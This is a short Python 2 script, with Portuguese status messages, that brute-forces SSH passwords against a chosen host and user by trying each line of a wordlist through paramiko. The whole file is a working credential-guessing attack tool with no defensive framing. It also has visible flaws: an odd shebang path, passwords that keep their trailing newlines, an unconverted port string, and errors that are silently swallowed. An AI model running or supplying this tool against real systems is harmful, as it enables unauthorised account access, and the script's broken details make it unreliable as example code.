#!/usr/share/python
# -*- coding: utf-8 -*-

import sys, argparse, paramiko

ssh = paramiko.SSHClient()

info = '''
Usage : ./bruteForce.py [options]\n
Options: -u, --user      <user>          |   User\n
         -t, --target    <hostname/ip>   |   Target\n
         -p, --port      <port>          |   Port\n
         -w, --wordlist  <wordlist>      |   Wordlist\n
         -h, --help                      |   Help\n
'''


def help():
    print info
    sys.exit(1)


def sshAsKnow():
    try:
        ssh.load_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    except:
        pass

def connectSSH(target, port, user, passwd):
    try:
        print "Enviando User: " + user + " "
        print "Enviando Pass: " + passwd + "\n"
        ssh.connect(target, port=port, username=user, password=passwd)
        print "[-] Autenticado com User: " + user + " e Pass: " + passwd + "\n"
    except:
        pass

def bruteForceSSH(target, port, user, passwd):
    try:
        wordlist = open(passwd, "r")
        words = wordlist.readlines()
        print "[-] Inicializando conexão SSH no IP - " + target + " [-] \n"
        print "[-] Carregando WL - " + passwd + " ...\n"

        for word in words:
            connectSSH(target, port, user, word)
    except:
        print "Error: " + str(sys.exc_info()[1])
        sys.exit(1)
        

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--user", help="User")
parser.add_argument("-t", "--target", help="Target")
parser.add_argument("-p", "--port", help="Port")
parser.add_argument("-w", "--wordlist", help="Wordlist")

args = parser.parse_args()

# if args is not used then print
if len(sys.argv) == 1 or args.user is None or args.target is None or args.wordlist is None:
    help()
    sys.exit(1)

target = args.target
user = args.user
wordlist = args.wordlist
port = args.port

if port is None:
    port = 22

sshAsKnow()
bruteForceSSH(target, port, user, wordlist)
print "[-] Brute Force was over. \n"
